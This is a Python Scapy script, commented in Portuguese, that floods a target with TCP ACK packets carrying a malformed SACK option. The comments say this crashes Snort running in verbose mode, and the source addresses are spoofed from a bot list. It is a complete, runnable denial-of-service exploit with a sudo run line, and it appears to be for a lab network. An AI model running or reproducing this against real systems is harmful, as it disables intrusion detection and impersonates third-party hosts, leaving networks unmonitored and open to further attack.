from scapy.all import *
import random, time, ipaddress

# ---------- CONFIGURAÇÃO ----------
TARGET_IP   = "192.168.100.2"
TARGET_PORT = 80                   # porta-alvo (pode ser qualquer uma)
BOTFILE     = "bots.txt"           # lista de bots (um IP por linha)
IFACE       = "enp0s3"             # interface de saída
PKTS_TOTAL  = 100                  # pacotes a enviar
# ----------------------------------

def load_bots(file):
    """Lê lista de IPs dos bots."""
    bots = []
    with open(file) as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)   # valida
                bots.append(ip)
    return bots

def run_snort_sack_dos():
    bots  = load_bots(BOTFILE)
    pkts  = []

    for _ in range(PKTS_TOTAL):
        src_ip = random.choice(bots)

        ip  = IP(src=src_ip, dst=TARGET_IP)
        # opção SACK malformada  ==>   options=[(5, b'')]
        # Scapy gera kind=5, length=2  (invalid length)  => crash Snort -v
        tcp = TCP(
            sport=RandShort(), dport=TARGET_PORT,
            flags='A', seq=random.randint(0, 0xFFFFFFFF),
            window=8192,
            options=[(5, b'')]          # <<--- TRIGGER
        )

        pkts.append(Ether() / ip / tcp)

    print(f"Preparados {len(pkts)} pacotes. Enviando...")
    t0 = time.perf_counter()
    sendpfast(pkts, iface=IFACE, file_cache=True)  # disparo rápido
    print(f"Concluído em {time.perf_counter()-t0:.4f}s.")

if __name__ == "__main__":
    run_snort_sack_dos()

# sudo PYTHONPATH=$HOME/scapy python3 tcp_snort.py